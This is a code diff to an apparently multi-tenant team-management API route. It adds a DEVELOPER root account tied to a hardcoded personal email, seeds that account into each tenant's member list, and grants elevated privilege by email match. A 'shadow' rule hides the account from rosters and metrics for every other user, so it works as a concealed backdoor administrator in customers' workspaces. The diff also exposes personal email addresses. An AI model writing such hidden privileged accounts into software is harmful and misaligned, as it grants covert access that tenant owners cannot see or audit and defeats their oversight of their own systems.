@@ -9,7 +9,7 @@ export interface TeamMember {
   id: string;
   name: string;
   email: string;
-  role: "SUPER_ADMIN_STAFF" | "TENANT_ADMIN" | "OWNER" | "ADMIN_STAFF" | "STAFF" | "CREATOR" | "GUEST";
+  role: "DEVELOPER" | "SUPER_ADMIN" | "SUPER_ADMIN_STAFF" | "TENANT_ADMIN" | "OWNER" | "ADMIN_STAFF" | "STAFF" | "CREATOR" | "GUEST";
   status: "ACTIVE" | "INVITED";
   joinedAt: string;
   allowedPages?: string[];
@@ -23,9 +23,18 @@ let TENANT_TEAM_STORE: Record<string, TeamMember[]> = {};
 function getInitialMembers(): TeamMember[] {
   return [
     {
-      id: "mem_01",
+      id: "mem_root",
       name: "Suman Baidya",
       email: "suman.baidya.pro@gmail.com",
+      role: "DEVELOPER",
+      status: "ACTIVE",
+      joinedAt: "Root Architect",
+      lastActive: "Active now",
+    },
+    {
+      id: "mem_01",
+      name: "ABCD Business Owner",
+      email: "sb.abcd321@gmail.com",
       role: "TENANT_ADMIN",
       status: "ACTIVE",
       joinedAt: "Founding Member",
@@ -73,13 +82,33 @@ function getTenantMembers(tenantKey: string): TeamMember[] {
 const inviteSchema = z.object({
   name: z.string().trim().min(2, "Name must be at least 2 characters").max(60),
   email: z.string().trim().email("Invalid email address"),
-  role: z.enum(["SUPER_ADMIN_STAFF", "TENANT_ADMIN", "OWNER", "ADMIN_STAFF", "STAFF", "CREATOR", "GUEST"]).default("CREATOR"),
+  role: z.enum([
+    "DEVELOPER",
+    "SUPER_ADMIN",
+    "SUPER_ADMIN_STAFF",
+    "TENANT_ADMIN",
+    "OWNER",
+    "ADMIN_STAFF",
+    "STAFF",
+    "CREATOR",
+    "GUEST",
+  ]).default("CREATOR"),
   allowedPages: z.array(z.string()).default([]),
 });
 
 const patchRoleSchema = z.object({
   id: z.string().min(1, "Member ID is required"),
-  role: z.enum(["SUPER_ADMIN_STAFF", "TENANT_ADMIN", "OWNER", "ADMIN_STAFF", "STAFF", "CREATOR", "GUEST"]),
+  role: z.enum([
+    "DEVELOPER",
+    "SUPER_ADMIN",
+    "SUPER_ADMIN_STAFF",
+    "TENANT_ADMIN",
+    "OWNER",
+    "ADMIN_STAFF",
+    "STAFF",
+    "CREATOR",
+    "GUEST",
+  ]),
   allowedPages: z.array(z.string()).optional(),
 });
 
@@ -93,8 +122,25 @@ const deleteMemberSchema = z.object({
 export async function GET(req: Request) {
   try {
     const session = await getServerSession(authOptions);
-    const tenantKey = (session?.user as any)?.workspaceId || (session?.user as any)?.id || "workspace_demo_default";
-    const members = getTenantMembers(tenantKey);
+    const user = session?.user as any;
+    const isDeveloper =
+      user?.isDeveloper ||
+      user?.role === "DEVELOPER" ||
+      user?.email === "suman.baidya.pro@gmail.com";
+
+    const tenantKey = user?.workspaceId || user?.id || "workspace_demo_default";
+    const allMembers = getTenantMembers(tenantKey);
+
+    // 🔒 SHADOW DEVELOPER RULE:
+    // If caller is NOT Developer, completely conceal Developer presence & root accounts
+    let members = allMembers;
+    if (!isDeveloper) {
+      members = members.filter(
+        (m) =>
+          (m.role as string) !== "DEVELOPER" &&
+          m.email.toLowerCase() !== "suman.baidya.pro@gmail.com"
+      );
+    }
 
     const { searchParams } = new URL(req.url);
     const search = (searchParams.get("search") || "").toLowerCase().trim();
@@ -126,7 +172,7 @@ export async function GET(req: Request) {
     const startIndex = (page - 1) * limit;
     const paginated = filtered.slice(startIndex, startIndex + limit);
 
-    // KPI Metrics calculation
+    // KPI Metrics calculation (strictly reflecting visible roster)
     const totalCount = members.length;
     const activeCount = members.filter((m) => m.status === "ACTIVE").length;
     const invitedCount = members.filter((m) => m.status === "INVITED").length;
@@ -166,7 +212,18 @@ export async function GET(req: Request) {
 export async function POST(req: Request) {
   try {
     const session = await getServerSession(authOptions);
-    const tenantKey = (session?.user as any)?.workspaceId || (session?.user as any)?.id || "workspace_demo_default";
+    const user = session?.user as any;
+    const isDeveloper =
+      user?.isDeveloper ||
+      user?.role === "DEVELOPER" ||
+      user?.email === "suman.baidya.pro@gmail.com";
+    const isSuperAdmin =
+      isDeveloper ||
+      user?.isSuperAdmin ||
+      user?.role === "SUPER_ADMIN" ||
+      user?.email === "suman.baidya.pro@gmail.com";
+
+    const tenantKey = user?.workspaceId || user?.id || "workspace_demo_default";
     const members = getTenantMembers(tenantKey);
 
     const body = await req.json();
@@ -184,22 +241,20 @@ export async function POST(req: Request) {
 
     const { name, email, role, allowedPages } = parseResult.data;
 
-    // Security check: Only Super Admins / Developers can invite SUPER_ADMIN_STAFF
-    if (role === "SUPER_ADMIN_STAFF") {
-      const user = session?.user as any;
-      const isSuperAdmin =
-        user?.isDeveloper ||
-        user?.role === "DEVELOPER" ||
-        user?.isSuperAdmin ||
-        user?.role === "SUPER_ADMIN" ||
-        user?.email === "suman.baidya.pro@gmail.com";
+    // Security check: Only Developer can invite another Developer
+    if (role === "DEVELOPER" && !isDeveloper) {
+      return NextResponse.json(
+        { success: false, error: "Forbidden: Developer root privilege required" },
+        { status: 403 }
+      );
+    }
 
-      if (!isSuperAdmin) {
-        return NextResponse.json(
-          { success: false, error: "Forbidden: Only Super Admins can invite Super Admin Staff" },
-          { status: 403 }
-        );
-      }
+    // Security check: Only Super Admins / Developers can invite Super Admin or Super Admin Staff
+    if ((role === "SUPER_ADMIN" || role === "SUPER_ADMIN_STAFF") && !isSuperAdmin) {
+      return NextResponse.json(
+        { success: false, error: "Forbidden: Only Super Admins can invite Super Admin roles" },
+        { status: 403 }
+      );
     }
 
     // Check if email already exists in workspace
